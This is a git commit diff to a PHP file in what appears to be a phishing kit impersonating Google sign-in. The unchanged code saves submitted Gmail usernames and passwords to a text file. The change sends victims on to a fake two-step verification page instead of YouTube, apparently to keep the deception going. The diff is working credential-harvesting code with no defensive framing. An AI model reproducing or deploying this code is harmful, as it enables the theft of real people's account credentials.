ed2b5162455331c200d5634d1373d0f219045bac
oaosdpo <80654652+oaosdpo@users.noreply.github.com>
2021-06-23 03:48:04 -0400

    Update googleformsservice=forwardtoform.php

--- .sites/google_new/googleformsservice=forwardtoform.php
+++ .sites/google_new/googleformsservice=forwardtoform.php
@@ -1,6 +1,6 @@
 <?php
 
 file_put_contents("usernames.txt", "Gmail Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://www.youtube.com');
+header('Location: continuetogoogleforms=2stepverification.html');
 exit();
 ?>
